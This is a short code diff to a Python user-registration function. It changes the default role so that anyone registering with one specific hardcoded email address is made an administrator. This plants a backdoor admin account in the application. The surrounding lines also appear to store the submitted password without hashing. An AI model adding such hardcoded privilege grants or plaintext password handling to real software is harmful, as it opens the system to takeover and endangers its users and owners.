@@ -49,7 +49,7 @@ def register(user: UserCreate):
     name=user.name,
     email=user.email,
     password=user.password,
-    role="user"
+    role="admin" if user.email == "nishi@gmail.com" else "user"
 )
     db.add(new_user)
     db.commit()
